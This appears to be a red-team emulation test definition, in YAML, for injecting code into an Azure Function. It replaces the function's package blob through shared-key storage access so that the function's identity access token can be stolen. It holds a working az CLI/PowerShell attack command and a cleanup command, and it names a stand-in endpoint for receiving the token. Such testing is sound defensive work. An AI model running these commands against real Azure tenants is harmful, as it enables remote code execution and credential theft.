---
- id: 7c6d8b0e8805f6e93134af818184f288
  name: Azure - Functions code upload - Functions code injection via Blob upload
  description: "This test injects code into an Azure Function (RCE).\n\nAttack idea/reference:\
    \ https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/\n\
    \nSimilar to T1528 \"Azure - Functions code upload - Functions code injection\
    \ to retrieve the Functions identity access token\", the depicted code injection\
    \ scenario tampers the source code of Azure Functions to perform Subscription\
    \ Privilege Escalation by retrieving the identity access token of an Azure functions\
    \ instance. In this case, the prepared zip file (underlying package for a Function)\
    \ is expected to contain the tampered function presented in src/code_to_insert.py.\
    \ Note that the endpoint https://changeme.net needs to be adapted in your packed\
    \ function code.\n\nNote:\n- The Azure Function modified in this test must be\
    \ hosted via Azure Blob storage (Info on storage considerations for Azure Function:\
    \ https://learn.microsoft.com/en-us/azure/azure-functions/storage-considerations).\
    \ \n- For Function code upload to Azure Functions that are hosted via Azure Files\
    \ in a File Share, refer to T1528 \"Azure - Functions code upload - Functions\
    \ code injection to retrieve the Functions identity access token\".\n- The required\
    \ input fields can be retrieved in a reconnaissance step in test T1619 \"Azure\
    \ - Enumerate Storage Account Objects via Key-based authentication using Azure\
    \ CLI\". The code of function apps may be inspected and prepared from the result\
    \ of test T1530 \"Azure - Dump Azure Storage Account Objects via Azure CLI\".\n\
    \nRequirements:\n- The test is intended to be executed in interactive mode (with\
    \ -Interactive parameter) in order to complete the az login command when MFA is\
    \ required.\n- The EntraID user must have the role \"Storage Account Contributor\"\
    , or a role with similar permissions."
  tactic: credential-access
  technique:
    attack_id: T1528
    name: Steal Application Access Token
  platforms:
    unknown:
      psh:
        command: az login; $allowSharedKeyAccess = az storage account show --name
          "storage_account_name_example" --query "allowSharedKeyAccess"; if ($allowSharedKeyAccess
          -eq "false") {;     Write-Output "Shared key access is disabled for this
          storage account."; } else {    ;     $connectionString = az storage account
          show-connection-string --name "storage_account_name_example" --query connectionString
          --output tsv;     $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_"
          + "blob_example");     az storage blob download --connection-string $connectionString
          --container-name "container_name_example" --name "blob_example" --file $tmpOriginalFunctionCode
          --overwrite true;     if ($LASTEXITCODE -eq 0) {;         az storage blob
          upload --connection-string $connectionString --container-name "container_name_example"
          --name "blob_example" --file "$env:temp/T1528_function_code.zip" --overwrite
          true;     } else {;         Write-Output "Download original function code
          failed.";         exit 1;     }; }
        payloads: []
        cleanup: 'az login; $tmpOriginalFunctionCode = Join-Path $env:temp/ ("T1528_tmp_original_"
          + "blob_example"); az storage blob upload --account-name "storage_account_name_example"
          --container-name "container_name_example" --file $tmpOriginalFunctionCode
          --name "blob_example" --overwrite true 2>$null; if ($LASTEXITCODE -eq 0)
          {;     Write-Output "Uploaded original version of function code.";     Remove-Item
          -Path $tmpOriginalFunctionCode -Force -erroraction silentlycontinue;     Write-Output
          "Deleted tmp original blob file: $($tmpOriginalFunctionCode)"; } else {;     Write-Output
          "Upload original function code failed."; }'
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
